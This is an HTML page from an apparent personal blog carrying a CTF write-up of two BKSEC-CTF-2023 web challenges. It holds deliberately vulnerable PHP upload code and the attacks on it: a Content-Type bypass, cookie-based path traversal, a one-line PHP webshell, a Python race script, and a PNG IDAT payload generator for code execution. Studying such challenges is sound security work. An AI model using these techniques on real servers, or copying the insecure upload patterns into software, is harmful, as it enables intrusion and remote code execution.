@@ -1,0 +1,560 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>BKSEC-CTF-2023 - WEB &#39;s challenges - Zoltán&#39;s Blog</title>
+  <meta name="description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;;$timestamp = time();$userValue = $_COOKIE[&#39;user&#39;];$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;&#39;;} elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2023-08-19-bksecctf2023\/",
+          "name": "Bksec ctf 2023 web \u0027s challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "BKSEC-CTF-2023 - WEB \u0027s challenges",
+  "description" : "WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) \u0026amp;\u0026amp; !empty($_FILES)) {\r$uploadpath = \u0026quot;\/var\/tmp\/\u0026quot;;\r$error = \u0026quot;\u0026quot;;\r$timestamp = time();\r$userValue = $_COOKIE[\u0027user\u0027];\r$target_file = $uploadpath . $userValue . \u0026quot;_\u0026quot; . $timestamp . \u0026quot;_\u0026quot; . $_FILES[\u0026quot;image\u0026quot;][\u0026quot;name\u0026quot;];\rmove_uploaded_file($_FILES[\u0026quot;image\u0026quot;][\u0026quot;tmp_name\u0026quot;], $target_file);\rif ($_FILES[\u0026quot;image\u0026quot;][\u0026quot;size\u0026quot;] \u0026gt; 1048576) {\r$error .= \u0027\u0026lt;p class=\u0026quot;h5 text-danger\u0026quot;\u0026gt;Maximum file size is 1MB.\u0026lt;\/p\u0026gt;\u0027;\r} elseif ($_FILES[\u0026quot;image\u0026quot;][\u0026quot;type\u0026quot;] !== \u0026quot;image\/jpeg\u0026quot;) {\r$error .= \u0027\u0026lt;p class=\u0026quot;h5 text-danger\u0026quot;\u0026gt;Only JPG files are allowed.",
+  "inLanguage" : "en",
+  "wordCount":  958 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, English" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2023-08-19-bksecctf2023\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="BKSEC-CTF-2023 - WEB &#39;s challenges" />
+<meta property="og:description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;;$timestamp = time();$userValue = $_COOKIE[&#39;user&#39;];$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;&#39;;} elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2023-08-19-bksecctf2023/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="BKSEC-CTF-2023 - WEB &#39;s challenges" />
+  <meta name="twitter:description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;; …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>BKSEC-CTF-2023 - WEB &#39;s challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="web-challs">WEB challs</h1>
+<h2 id="metadata-checker">Metadata checker</h2>
+<ul>
+<li>This is whitebox challenge, you can view source below:</li>
+</ul>
+<pre><code>if (isset($_FILES) &amp;&amp; !empty($_FILES)) {
+    $uploadpath = &quot;/var/tmp/&quot;;
+    $error = &quot;&quot;;
+    
+    $timestamp = time();
+
+    $userValue = $_COOKIE['user'];
+    $target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
+
+    move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);
+
+    if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {
+        $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;';
+    } elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {
+        $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.&lt;/p&gt;';
+    } else {
+      $exif = exif_read_data($target_file, 0, true);
+
+      if ($exif === false) {
+          $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;No metadata found.&lt;/p&gt;';
+      } else {
+          $metadata = '&lt;table class=&quot;table table-striped&quot;&gt;';
+          foreach ($exif as $key =&gt; $section) {
+              $metadata .=
+                  '&lt;thead&gt;&lt;tr&gt;&lt;th colspan=&quot;2&quot; class=&quot;text-center&quot;&gt;' .
+                  $key .
+                  &quot;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&quot;;
+              foreach ($section as $name =&gt; $value) {
+                  $metadata .=
+                      &quot;&lt;tr&gt;&lt;td&gt;&quot; . $name . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $value . &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;
+              }
+              $metadata .= &quot;&lt;/tbody&gt;&quot;;
+          }
+          $metadata .= &quot;&lt;/table&gt;&quot;;
+      }
+    }
+}
+?&gt;
+</code></pre><pre><code>   &lt;?php
+        // I want to show a loading effect within 1.5s here but don't know how
+        sleep(1.5);
+        // This might be okay..... I think so
+        // My teammates will help me fix it later, I hope they don't forget that
+        echo $error;
+        echo $metadata;
+        unlink($target_file);
+        ?&gt;
+</code></pre><ul>
+<li>You can see this challenge about upload file</li>
+</ul>
+<h3 id="flow-">Flow :</h3>
+<ul>
+<li>Check if exist $_FILE initialization $uploadpath = &ldquo;/var/tmp/&quot;;</li>
+<li>Get cookie &ldquo;user&rdquo; to set name $target_file.</li>
+<li>move_uploaded_file to $target_file</li>
+<li>Maximum file size is 1MB and Only JPG files are allowed.</li>
+<li>Read metadata this file to show information about it.</li>
+<li>unlink($target_file); after 1.5s.</li>
+</ul>
+<h3 id="handle-">Handle :</h3>
+<ul>
+<li>It seems like this is a challenge to pass the file type check so we will change the ContentType of the file to pass this filter and to upload a php file.</li>
+<li>But one more problem here is that the php file will not be processed by the server because its location is in /var/tmp/ and observe here we can control the &ldquo;user&rdquo; cookie in $target_file, you can see:</li>
+</ul>
+<pre><code>$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
+</code></pre><ul>
+<li>So I will use pathtraversal technique to move my php file to /var/www/html/ so that my php file can be run.</li>
+<li>Our final problem here is that this file will be deleted after 1.5 seconds of being sent to the server, so we need to race to get the data in that time.</li>
+</ul>
+<h3 id="deployment-">Deployment :</h3>
+<ul>
+<li>Flag in question in /flag.txt</li>
+<li>I touch a file php basic</li>
+</ul>
+<pre><code>&lt;?php echo system('cat /flag.txt');?&gt;
+</code></pre><ul>
+<li>Control $target_file:</li>
+</ul>
+<pre><code>$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
+</code></pre><ul>
+<li>
+<p>I change $_COOKIE[&lsquo;user&rsquo;] to &ldquo;../../../../../../var/html/&rdquo;</p>
+</li>
+<li>
+<p>In example file name is l3m.php.</p>
+</li>
+<li>
+<p>$target_file this will be worth it /var/tmp/../../../../../../var/html/_(current_time)_l3m.php.</p>
+</li>
+<li>
+<p>I touch POC by python to Race with Burp Intruder to to continuously upload files to the server</p>
+</li>
+<li>
+<p><strong>POC</strong>:</p>
+</li>
+</ul>
+<pre><code>import requests
+import time
+
+url = &quot;http://18.141.143.171:30149/&quot;
+
+
+while True:
+    file_name = &quot;_&quot; + str(int(time.time())) + &quot;_l3m.php&quot;
+    res = requests.get(url + file_name) 
+    print(res.text)
+</code></pre><h2 id="image-copy-resample">Image Copy resample</h2>
+<p>This is whitebox challenge, you can view source below:</p>
+<pre><code>&lt;?php
+
+if(isset($_FILES['image'])){
+    $upload_dir = &quot;./uploads/&quot;;
+    $file_name = $_FILES['image']['name'];
+    $file_tmp = $_FILES['image']['tmp_name'];
+    $file_type = $_FILES['image']['type'];
+    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
+    $size_check = getimagesize($file_tmp);
+    $allowed_ext = array('jpg', 'png', 'php');
+    if(in_array($file_ext, $allowed_ext)){
+        $image = imagecreatefromstring(file_get_contents($file_tmp));
+        $cropped_image = imagecreatetruecolor(40, 40);
+        imagecopyresampled($cropped_image, $image, 0, 0, 0, 0, 40, 40, imagesx($image), imagesy($image));
+        $random_name = md5(uniqid(rand(), true));
+        $new_file_name = $random_name . '.' . $file_ext;   
+        if ($file_ext === 'jpg' || $file_ext === 'png'  ) {
+            //check size
+            if ($size_check[0] &lt; 40 || $size_check[1] &lt; 40) { 
+                echo &quot;Ảnh của bạn hơi nhỏ. Chúng tôi cần ảnh lớn hơn 40x40 pixels\n&lt;br&gt;&quot;;
+            } else {
+                if($file_ext === 'jpg'){
+                    imagejpeg($cropped_image, $upload_dir . $new_file_name);
+                } else {
+                    imagepng($cropped_image, $upload_dir . $new_file_name);
+                }
+                echo &quot;ảnh đã được lưu tại đây\n&lt;br&gt;&quot;;
+                echo $upload_dir;
+                echo $new_file_name;  
+
+                imagedestroy($image);
+                imagedestroy($cropped_image);
+            }
+        } else {
+            imagepng($cropped_image, $upload_dir . $new_file_name);
+            echo &quot;ảnh đã được lưu tại đây\n&lt;br&gt;&quot;;
+            echo $upload_dir;
+            echo $new_file_name;  
+
+            imagedestroy($image);
+            imagedestroy($cropped_image);
+        }
+    } else {        
+        echo &quot;Chỉ cho phép tải lên tệp JPG hoặc PNG và pHp ;D ? ? ?&quot;;
+    }
+}
+?&gt;
+&lt;!-- HTML Form để tải lên tệp --&gt;
+&lt;h3&gt;upload file ảnh miễn phí nhưng tôi sẽ nén chất lượng của bạn xuống 40px&lt;/h3&gt;
+&lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Tải Lên&quot;&gt;
+&lt;/form&gt;
+</code></pre><ul>
+<li>
+<p>Alow upload php extendtion, jpg and png we chose php :&lt;</p>
+</li>
+<li>
+<p>Regarding the simple functional diagram, upload the file and re-edit the uploaded image with a size of 40px.
+<img src="https://hackmd.io/_uploads/Byf8KJ_sp.png" alt="image"></p>
+</li>
+<li>
+<p>There are functions like imagecreatefromstring or imagecopyresampled which are quite strange.</p>
+</li>
+<li>
+<p>how could I upload the file (containing the shell) and still see it through the other functions.</p>
+</li>
+<li>
+<p>You have 2 or more ways to solve this problem</p>
+</li>
+</ul>
+<p>Tool : <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">IDAT</a> or</p>
+<pre><code>&lt;?php
+ 
+header('Content-Type: image/png');
+ 
+$p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0xD2, 0x88, 0xFC, 0x69, 0xD0, 0x2B, 0xB9, 0xB0, 0xFB, 0xBB, 0x79, 0xFC, 0xED, 0x22, 0x38, 0x49, 0xD3, 0x51, 0xB7, 0x3F, 0x02, 0xC2, 0x20, 0xD8, 0xD9, 0x3C, 0x67, 0xF4, 0x50, 0x67, 0xF4, 0x50, 0xA3, 0x9F, 0x67, 0xA5, 0xBE, 0x5F, 0x76, 0x74, 0x5A, 0x4C, 0xA1, 0x3F, 0x7A, 0xBF, 0x30, 0x6B, 0x88, 0x2D, 0x60, 0x65, 0x7D, 0x52, 0x9D, 0xAD, 0x88, 0xA1, 0x66, 0x94, 0xA1, 0x27, 0x56, 0xEC, 0xFE, 0xAF, 0x57, 0x57, 0xEB, 0x2E, 0x20, 0xA3, 0xAE, 0x58, 0x80, 0xA7, 0x0C, 0x10, 0x55, 0xCF, 0x09, 0x5C, 0x10, 0x40, 0x8A, 0xB9, 0x39, 0xB3, 0xC8, 0xCD, 0x64, 0x45, 0x3C, 0x49, 0x3E, 0xAD, 0x3F, 0x33, 0x56, 0x1F, 0x19 );
+ 
+$img = imagecreatetruecolor(110, 110);
+ 
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+$r = $p[$y];
+$g = $p[$y+1];
+$b = $p[$y+2];
+$color = imagecolorallocate($img, $r, $g, $b);
+imagesetpixel($img, round($y / 3)*2, 0, $color);
+imagesetpixel($img, round($y / 3)*2+1, 0, $color);
+imagesetpixel($img, round($y / 3)*2, 1, $color);
+imagesetpixel($img, round($y / 3)*2+1, 1, $color);
+}
+ 
+imagepng($img);
+?&gt;
+
+</code></pre><p><img src="https://hackmd.io/_uploads/rk-ki1OsT.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SyDlj1usT.png" alt="image"></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/english/">English</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2023-01-14-cookiearena/" data-toggle="tooltip" data-placement="top" title="Cookie arena">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-01-28-bi0sctf2024/" data-toggle="tooltip" data-placement="top" title="Bi0sCTF 2024 - WEB &#39;s challenges">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
